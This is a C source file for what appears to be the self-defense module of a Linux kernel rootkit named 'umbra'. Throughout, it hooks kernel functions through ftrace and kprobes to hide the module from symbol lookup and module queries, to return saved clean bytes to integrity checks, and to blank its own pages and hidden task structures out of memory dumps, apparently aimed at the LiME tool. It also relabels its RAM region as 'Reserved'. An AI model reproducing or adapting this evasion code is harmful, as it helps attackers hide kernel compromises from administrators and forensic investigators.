/*
Initial and poop version of umbra selfdefense.c module
*/


#include "../include/ub_core.h"
#include "../ftrace/hook_engine.h"
#include "../include/armor.h"

#define UB_ARMOR_PROLOGUE  64
#define UB_ARMOR_MAX_SNAPS      512

struct ub_armor_snap {
    unsigned long addr;
    u8            bytes[UB_ARMOR_PROLOGUE];
};

static struct ub_armor_snap snaps[UB_ARMOR_MAX_SNAPS];
static int            nsnaps = 0;
static DEFINE_SPINLOCK(ub_armor_lock);

notrace void ub_armor_protect_symbol(const char *symname)
{
    unsigned long addr;
    unsigned long flags;
    struct ub_armor_snap *s;
    int i;

    addr = (unsigned long)ub_resolve_symbol(symname);
    if (!addr)
        return;

    spin_lock_irqsave(&ub_armor_lock, flags);
    for (i = 0; i < nsnaps; i++) {
        if (snaps[i].addr == addr) {
            spin_unlock_irqrestore(&ub_armor_lock, flags);
            return;
        }
    }
    if (nsnaps >= UB_ARMOR_MAX_SNAPS) {
        spin_unlock_irqrestore(&ub_armor_lock, flags);
        return;
    }
    s = &snaps[nsnaps++];
    s->addr = addr;
    memcpy(s->bytes, (const void *)addr, UB_ARMOR_PROLOGUE);
    spin_unlock_irqrestore(&ub_armor_lock, flags);
}

static notrace const u8 *ub_armor_find_snap(unsigned long addr, size_t size)
{
    int i;
    for (i = 0; i < nsnaps; i++) {
        if (addr >= snaps[i].addr &&
            (addr + size) <= (snaps[i].addr + UB_ARMOR_PROLOGUE))
            return snaps[i].bytes + (addr - snaps[i].addr);
    }
    return NULL;
}

static int (*ub_real_register_kprobe)(struct kprobe *p);

static notrace int ub_hook_register_kprobe(struct kprobe *p)
{
    int ret;
    const char *saved;

    if (!p)
        return ub_real_register_kprobe(p);

    if (within_module((unsigned long)__builtin_return_address(0), THIS_MODULE)) {
        saved          = p->symbol_name;
        p->symbol_name = NULL;
        ret = ub_real_register_kprobe(p);
        p->symbol_name = saved;
        return ret;
    }

    return ub_real_register_kprobe(p);
}

static struct ftrace_ops kprobe_hook_ops = {
    .func  = NULL,
    .flags = FTRACE_OPS_FL_SAVE_REGS |
             FTRACE_OPS_FL_RECURSION |
             FTRACE_OPS_FL_IPMODIFY,
};

static void notrace kprobe_ftrace_thunk(unsigned long ip,
                                        unsigned long parent_ip,
                                        struct ftrace_ops *ops,
                                        struct ftrace_regs *fregs)
{
    if (!within_module(parent_ip, THIS_MODULE))
        ftrace_regs_set_instruction_pointer(fregs,
            (unsigned long)ub_hook_register_kprobe);
}

notrace int ub_armor_bootstrap_kprobe_hook(void)
{
    unsigned long addr = (unsigned long)&register_kprobe;
    int err;

    ub_real_register_kprobe = (int (*)(struct kprobe *))addr;
    kprobe_hook_ops.func = kprobe_ftrace_thunk;

    err = ftrace_set_filter_ip(&kprobe_hook_ops, addr, 0, 0);
    if (err)
        return err;

    err = register_ftrace_function(&kprobe_hook_ops);
    if (err) {
        ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
        return err;
    }

    return 0;
}

static void ub_armor_bootstrap_kprobe_unhook(void)
{
    unsigned long addr = (unsigned long)&register_kprobe;
    unregister_ftrace_function(&kprobe_hook_ops);
    ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
}

static long (*ub_real_copy_from_kernel_nofault)(void *dst, const void *src,
                                              size_t size);

static notrace long ub_hook_copy_from_kernel_nofault(void *dst, const void *src,
                                                   size_t size)
{
    unsigned long addr = (unsigned long)src;
    const u8 *snap;

    if (within_module(addr, THIS_MODULE)) {
        snap = ub_armor_find_snap(addr, size);
        if (snap && dst) { memcpy(dst, snap, size); return 0; }
        if (dst) memset(dst, 0x90, size);
        return 0;
    }

    snap = ub_armor_find_snap(addr, size);
    if (snap && dst) {
        memcpy(dst, snap, size);
        return 0;
    }

    return ub_real_copy_from_kernel_nofault(dst, src, size);
}

typedef int (*ksym_cb_t)(void *data, const char *name, unsigned long addr);
static int (*ub_real_kallsyms_on_each_symbol)(ksym_cb_t fn, void *data);

struct ub_armor_filter { ksym_cb_t fn; void *data; };

static notrace int ub_armor_ksym_cb(void *data, const char *name, unsigned long addr)
{
    struct ub_armor_filter *f = data;
    if (within_module(addr, THIS_MODULE))
        return 0;
    return f->fn(f->data, name, addr);
}

static notrace int ub_hook_kallsyms_on_each_symbol(ksym_cb_t fn, void *data)
{
    struct ub_armor_filter f = { .fn = fn, .data = data };
    return ub_real_kallsyms_on_each_symbol(ub_armor_ksym_cb, &f);
}

static struct module *(*ub_real_module_address)(unsigned long addr);

static notrace struct module *ub_hook_module_address(unsigned long addr)
{
    if (within_module(addr, THIS_MODULE))
        return NULL;

    return ub_real_module_address(addr);
}

static struct module *(*ub_real_find_module)(const char *name);

static notrace struct module *ub_hook_find_module(const char *name)
{
    if (name && strcmp(name, KBUILD_MODNAME) == 0)
        return NULL;
    return ub_real_find_module(name);
}

static notrace void ub_armor_module_phys_range(unsigned long *phys_start,
                                          unsigned long *phys_end)
{
    unsigned long va, size;
    struct page *pg;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    va   = (unsigned long)THIS_MODULE->mem[MOD_TEXT].base;
    size = THIS_MODULE->mem[MOD_TEXT].size;
#else
    va   = (unsigned long)THIS_MODULE->core_layout.base;
    size = THIS_MODULE->core_layout.size;
#endif

    if (!va || !size) {
        *phys_start = 0;
        *phys_end   = 0;
        return;
    }

    pg = vmalloc_to_page((void *)va);
    *phys_start = pg ? page_to_phys(pg) : 0;

    pg = vmalloc_to_page((void *)(va + size - 1));
    *phys_end = pg ? (page_to_phys(pg) + PAGE_SIZE - 1) : 0;
}

typedef int (*walk_ram_cb_t)(u64, u64, void *);
static int (*ub_real_walk_system_ram_res)(u64 start, u64 end, void *arg,
                                       walk_ram_cb_t func);

struct ub_armor_walk_ctx { walk_ram_cb_t real_cb; void *real_arg; };

static notrace int ub_armor_walk_filter(u64 start, u64 end, void *arg)
{
    struct ub_armor_walk_ctx *ctx   = arg;
    unsigned long mod_start = 0, mod_end = 0;

    ub_armor_module_phys_range(&mod_start, &mod_end);

    if (!mod_end || end < mod_start || start > mod_end)
        return ctx->real_cb(start, end, ctx->real_arg);

    if (start < mod_start)
        ctx->real_cb(start, (u64)mod_start - 1, ctx->real_arg);

    if (end > mod_end)
        ctx->real_cb((u64)mod_end + 1, end, ctx->real_arg);

    return 0;
}

static notrace int ub_hook_walk_system_ram_res(u64 start, u64 end, void *arg,
                                             walk_ram_cb_t func)
{
    struct ub_armor_walk_ctx ctx = { .real_cb = func, .real_arg = arg };
    return ub_real_walk_system_ram_res(start, end, &ctx, ub_armor_walk_filter);
}

typedef int (*walk_iomem_cb_t)(struct resource *, void *);
static int (*ub_real_walk_iomem_res_desc)(unsigned long desc, unsigned long flags,
                                        u64 start, u64 end, void *arg,
                                        walk_iomem_cb_t func);

struct ub_armor_iomem_ctx { walk_iomem_cb_t real_cb; void *real_arg; };

static notrace int ub_armor_iomem_filter(struct resource *res, void *arg)
{
    struct ub_armor_iomem_ctx *ctx = arg;
    unsigned long mod_start = 0, mod_end = 0;

    if (!res) return 0;

    ub_armor_module_phys_range(&mod_start, &mod_end);

    if (!mod_end ||
        (u64)res->end < mod_start || (u64)res->start > mod_end)
        return ctx->real_cb(res, ctx->real_arg);

    return 0;
}

static notrace int ub_hook_walk_iomem_res_desc(unsigned long desc,
                                             unsigned long flags,
                                             u64 start, u64 end,
                                             void *arg,
                                             walk_iomem_cb_t func)
{
    struct ub_armor_iomem_ctx ctx = { .real_cb = func, .real_arg = arg };
    return ub_real_walk_iomem_res_desc(desc, flags, start, end,
                                    &ctx, ub_armor_iomem_filter);
}

extern struct resource iomem_resource;

static rwlock_t *ub_armor_resource_lock = NULL;

static const char *iomem_saved_name = NULL;
static struct resource *iomem_poisoned = NULL;

static notrace void ub_armor_poison_iomem(void)
{
    unsigned long mod_phys = 0, mod_phys_end = 0;
    struct resource *r;

    if (!ub_armor_resource_lock) return;

    ub_armor_module_phys_range(&mod_phys, &mod_phys_end);
    if (!mod_phys) return;

    read_lock(ub_armor_resource_lock);
    for (r = iomem_resource.child; r; r = r->sibling) {
        if (r->name &&
            strcmp(r->name, "System RAM") == 0 &&
            (unsigned long)r->start <= mod_phys &&
            (unsigned long)r->end   >= mod_phys) {
            iomem_saved_name = r->name;
            iomem_poisoned   = r;
            WRITE_ONCE(r->name, "Reserved");
            break;
        }
    }
    read_unlock(ub_armor_resource_lock);
}

static notrace void ub_armor_restore_iomem(void)
{
    if (iomem_poisoned && iomem_saved_name) {
        WRITE_ONCE(iomem_poisoned->name, iomem_saved_name);
        iomem_poisoned   = NULL;
        iomem_saved_name = NULL;
    }
}

#define UB_ARMOR_MAX_PAGES 2048
static unsigned long ub_armor_mod_phys_pages[UB_ARMOR_MAX_PAGES];
static int           ub_armor_mod_phys_count = 0;

static void ub_armor_init_mod_pages(void)
{
    unsigned long va, size, offset;
    struct page *pg;

    ub_armor_mod_phys_count = 0;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    {
        enum mod_mem_type s;
        for (s = 0; s < MOD_MEM_NUM_TYPES; s++) {
            va   = (unsigned long)THIS_MODULE->mem[s].base;
            size = THIS_MODULE->mem[s].size;
            if (!va || !size)
                continue;
            for (offset = 0; offset < size &&
                 ub_armor_mod_phys_count < UB_ARMOR_MAX_PAGES; offset += PAGE_SIZE) {
                pg = vmalloc_to_page((void *)(va + offset));
                if (pg)
                    ub_armor_mod_phys_pages[ub_armor_mod_phys_count++] =
                        page_to_phys(pg) & PAGE_MASK;
            }
        }
    }
#else
    va   = (unsigned long)THIS_MODULE->core_layout.base;
    size = THIS_MODULE->core_layout.size;
    for (offset = 0; offset < size && ub_armor_mod_phys_count < UB_ARMOR_MAX_PAGES;
         offset += PAGE_SIZE) {
        pg = vmalloc_to_page((void *)(va + offset));
        if (pg)
            ub_armor_mod_phys_pages[ub_armor_mod_phys_count++] = page_to_phys(pg) & PAGE_MASK;
    }
#endif
}

static notrace bool ub_armor_is_mod_page(unsigned long phys)
{
    int i;
    phys &= PAGE_MASK;
    for (i = 0; i < ub_armor_mod_phys_count; i++)
        if (ub_armor_mod_phys_pages[i] == phys)
            return true;
    return false;
}

static char ub_armor_zero_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

static char ub_armor_scratch_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
static DEFINE_SPINLOCK(ub_armor_scratch_lock);

#define UB_ARMOR_MAX_PARTIAL 256
struct ub_armor_partial_entry {
    unsigned long phys;
    unsigned long off;
    unsigned long len;
};
static struct ub_armor_partial_entry ub_armor_partial[UB_ARMOR_MAX_PARTIAL];
static int ub_armor_partial_count = 0;
static DEFINE_SPINLOCK(ub_armor_pages_lock);

notrace void ub_armor_register_phys_range(const void *va, size_t size)
{
    unsigned long addr = (unsigned long)va & PAGE_MASK;
    unsigned long end  = (unsigned long)va + size;
    unsigned long flags;

    while (addr < end) {
        unsigned long pg_end = addr + PAGE_SIZE;
        unsigned long off    = ((unsigned long)va > addr)
                                ? ((unsigned long)va - addr) : 0;
        unsigned long len    = min(pg_end, end) - (addr + off);
        unsigned long phys;
        int i;

        if (virt_addr_valid((void *)addr))
            phys = virt_to_phys((void *)addr) & PAGE_MASK;
        else {
            struct page *pg = vmalloc_to_page((void *)addr);
            phys = pg ? (page_to_phys(pg) & PAGE_MASK) : 0;
        }

        if (phys) {
            spin_lock_irqsave(&ub_armor_pages_lock, flags);
            for (i = 0; i < ub_armor_partial_count; i++) {
                if (ub_armor_partial[i].phys == phys &&
                    ub_armor_partial[i].off == off) {
                    if (len > ub_armor_partial[i].len)
                        ub_armor_partial[i].len = len;
                    goto next;
                }
            }
            if (ub_armor_partial_count < UB_ARMOR_MAX_PARTIAL) {
                ub_armor_partial[ub_armor_partial_count].phys = phys;
                ub_armor_partial[ub_armor_partial_count].off  = off;
                ub_armor_partial[ub_armor_partial_count].len  = len;
                ub_armor_partial_count++;
            }
next:
            spin_unlock_irqrestore(&ub_armor_pages_lock, flags);
        }

        addr += PAGE_SIZE;
    }
}

notrace void ub_armor_register_hidden_task(struct task_struct *task)
{
    if (task)
        ub_armor_register_phys_range(task, sizeof(*task));
}

static struct kprobe ub_armor_copy_mc_kp;
static int ub_armor_copy_mc_kp_active = 0;

static int notrace ub_armor_copy_mc_pre(struct kprobe *p, struct pt_regs *regs)
{
    void *src = (void *)regs->si;
    unsigned long phys = 0;
    int i, found_partial = 0;

    if (!ub_armor_mod_phys_count && !ub_armor_partial_count)
        return 0;

    if (virt_addr_valid(src)) {
        phys = virt_to_phys(src) & PAGE_MASK;
    } else {
        struct page *pg = vmalloc_to_page(src);
        if (pg)
            phys = page_to_phys(pg) & PAGE_MASK;
    }

    if (!phys)
        return 0;

    if (ub_armor_is_mod_page(phys)) {
        regs->si = (unsigned long)ub_armor_zero_page;
        return 0;
    }

    spin_lock(&ub_armor_scratch_lock);
    for (i = 0; i < ub_armor_partial_count; i++) {
        if (ub_armor_partial[i].phys != phys)
            continue;
        if (!found_partial) {
            memcpy(ub_armor_scratch_page, src, PAGE_SIZE);
            found_partial = 1;
        }
        memset(ub_armor_scratch_page + ub_armor_partial[i].off, 0, ub_armor_partial[i].len);
    }
    if (found_partial)
        regs->si = (unsigned long)ub_armor_scratch_page;
    spin_unlock(&ub_armor_scratch_lock);

    return 0;
}

static int ub_armor_copy_mc_kprobe_install(void)
{
    unsigned long addr = (unsigned long)ub_resolve_symbol("copy_mc_to_kernel");
    int ret;

    if (!addr)
        return -ENOENT;
    memset(&ub_armor_copy_mc_kp, 0, sizeof(ub_armor_copy_mc_kp));
    ub_armor_copy_mc_kp.pre_handler = ub_armor_copy_mc_pre;
    ub_armor_copy_mc_kp.addr        = (kprobe_opcode_t *)addr;
    ret = register_kprobe(&ub_armor_copy_mc_kp);
    if (ret == 0)
        ub_armor_copy_mc_kp_active = 1;
    return ret;
}

static void ub_armor_copy_mc_kprobe_remove(void)
{
    if (ub_armor_copy_mc_kp_active) {
        unregister_kprobe(&ub_armor_copy_mc_kp);
        ub_armor_copy_mc_kp_active = 0;
    }
}

static struct ftrace_hook ub_armor_hooks_core[] = {
    HOOK("copy_from_kernel_nofault", ub_hook_copy_from_kernel_nofault,
                                     &ub_real_copy_from_kernel_nofault),
    HOOK("kallsyms_on_each_symbol",  ub_hook_kallsyms_on_each_symbol,
                                     &ub_real_kallsyms_on_each_symbol),
    HOOK("__module_address",         ub_hook_module_address,
                                     &ub_real_module_address),
    HOOK("find_module",              ub_hook_find_module,
                                     &ub_real_find_module),
};

static struct ftrace_hook ub_armor_hooks_lime[] = {
    HOOK("walk_system_ram_res",  ub_hook_walk_system_ram_res,  &ub_real_walk_system_ram_res),
    HOOK("walk_iomem_res_desc",  ub_hook_walk_iomem_res_desc,  &ub_real_walk_iomem_res_desc),
};

static unsigned int ub_armor_lime_installed = 0;

notrace int ub_armor_start(void)
{
    int err;

    ub_armor_resource_lock = (rwlock_t *)ub_resolve_symbol("resource_lock");
    ub_armor_init_mod_pages();

    err = ub_fh_install_hooks(ub_armor_hooks_core, ARRAY_SIZE(ub_armor_hooks_core));
    if (err)
        return err;

    {
        int i;
        for (i = 0; i < (int)ARRAY_SIZE(ub_armor_hooks_lime); i++) {
            if (ub_fh_install_hook(&ub_armor_hooks_lime[i]) == 0)
                ub_armor_lime_installed |= (1u << i);
        }
    }

    ub_armor_copy_mc_kprobe_install();

    ub_armor_poison_iomem();

    return 0;
}

notrace void ub_armor_stop(void)
{
    ub_armor_restore_iomem();
    ub_armor_copy_mc_kprobe_remove();

    ub_fh_remove_hooks(ub_armor_hooks_core, ARRAY_SIZE(ub_armor_hooks_core));

    {
        int i;
        for (i = 0; i < (int)ARRAY_SIZE(ub_armor_hooks_lime); i++) {
            if (ub_armor_lime_installed & (1u << i))
                ub_fh_remove_hook(&ub_armor_hooks_lime[i]);
        }
        ub_armor_lime_installed = 0;
    }
    ub_armor_bootstrap_kprobe_unhook();

    nsnaps = 0;
}